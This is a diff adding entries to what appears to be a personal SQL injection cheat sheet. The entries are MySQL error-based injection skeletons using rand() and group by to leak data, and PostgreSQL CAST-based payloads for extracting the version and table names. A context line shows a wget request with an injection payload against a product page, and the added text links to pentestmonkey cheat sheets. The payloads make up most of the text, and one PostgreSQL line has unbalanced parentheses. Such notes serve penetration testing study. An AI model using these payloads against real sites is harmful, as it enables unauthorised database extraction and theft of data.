@@ -255,6 +255,36 @@ wget "vulnerable URL"/products.php?id=1 or 1 IN (SELECT TOP 1 CAST(db_name() as 
 
 SQLi exploitation using "group by" statement::
 
+in case there's repeated values, the group by statement will remove duplicates.
+
+MySQL skeleton to create error-based injections:
+
+select 1, 2 union select count(*), concat(<information to extract>,floor(rand(0)*2)) as x from information_schema.tables group by x;
+
+extract database version on MySQL:
+SELECT count(*), concat(version(), floor(rand(0)*2)) as x from information_schema.tables group by x;
+
+POSTGRE ERROR BASED
+
+technique/command: 
+
+...> get version
+
+SELECT CAST(version()) as numeric);
+
+...> get tables
+
+SELECT CAST((SELECT table_name from information_schema.tables limit 1 offset 0) as numeric);
+
+NOTE: to get all tables it is needed to change/modify the "offset" section from 0 to X number.
+
+<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">mssql-sql-injection-cheat-sheet</a>
+
+<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">mysql-sql-injection-cheat-sheet</a>
+
+<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet">postgres-sql-injection-cheat-sheet</a>
+
+
 
 
 
